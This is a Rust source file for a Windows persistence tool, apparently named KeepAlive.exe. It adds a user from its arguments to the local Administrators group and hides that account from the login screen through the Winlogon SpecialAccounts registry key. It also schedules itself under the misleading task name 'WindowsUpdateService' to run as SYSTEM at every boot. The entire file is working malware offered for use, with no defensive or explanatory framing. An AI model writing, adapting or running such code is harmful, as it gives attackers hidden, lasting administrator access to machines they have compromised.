#![allow(unused_parens)]
#![allow(unused_must_use)]
use winreg::enums::*;
use winreg::RegKey;
fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 3 {
        println!("usage: KeepAlive.exe newUserUSER newUserPASS");
        std::process::exit(1);
    }
    let username: String = args[1].clone();
    let password: String = args[2].clone();

    std::process::Command::new("net")
        .arg("user")
        .arg(&username)
        .arg(&password)
        .arg("/add")
        .status();

    std::process::Command::new("net")
        .arg("localgroup")
        .arg("administrators")
        .arg(&username)
        .arg("/add")
        .status();

    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
    let (subkey, _ ) = hkcu.create_subkey(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList").unwrap();
    
    subkey.set_value(&username, &0u32);

    let path_to_exe = std::env::current_exe().unwrap();
    let string_path_to_exe = format!("\"{}\" {} {}", path_to_exe.display(), username, password);

    std::process::Command::new("schtasks")
        .arg("/create")
        .arg("/tn")
        .arg("WindowsUpdateService")
        .arg("/tr")
        .arg(&string_path_to_exe)
        .arg("/sc")
        .arg("onstart")
        .arg("/ru")
        .arg("SYSTEM")
        .arg("/f")
        .status();
}